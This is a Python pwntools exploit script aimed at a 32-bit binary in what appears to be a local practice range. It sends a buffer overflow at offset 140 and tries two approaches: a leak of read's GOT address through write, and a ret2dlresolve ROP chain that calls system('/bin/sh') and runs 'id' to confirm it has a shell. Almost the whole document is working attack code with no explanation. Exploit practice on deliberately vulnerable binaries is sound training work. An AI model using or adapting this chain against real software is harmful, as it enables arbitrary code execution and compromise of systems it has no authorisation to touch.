from pwn import *
import os, sys
context.log_level='error'; context.arch='i386'
exe=os.path.expanduser('~/pwnrange/chals/b1/bin_79b89d7c')
elf=ELF(exe, checksec=False)
print('got.read@',hex(elf.got['read']),'plt.read',hex(elf.plt['read']),'vuln',hex(elf.symbols['vulnerable_function']))
print('plt0',hex(elf.get_section_by_name('.plt').header.sh_addr))

def trial(mode):
    p=process(exe)
    out=b''
    try:
        if mode=='dl':
            dl=Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
            rop=ROP(elf)
            rop.read(0, dl.data_addr)
            rop.ret2dlresolve(dl)
            raw=rop.chain()
            print('dl chain:', raw.hex())
            p.send(flat({140: raw}))
            sleep(0.3)
            p.send(dl.payload)
            p.sendline(b'echo PWNED_DL; id')
            out=p.recvrepeat(1.5)
        else:
            raw=p32(elf.plt['write'])+p32(elf.symbols['vulnerable_function'])+p32(1)+p32(elf.got['read'])+p32(4)
            p.send(flat({140:raw}))
            leak=p.recv(4)
            print('leak',leak.hex(),'len',len(leak))
            out=b''
    except Exception as e:
        out=('EXC '+repr(e)).encode()
    p.close()
    print(mode,'->',out[:300])
trial('leak')
trial('dl')
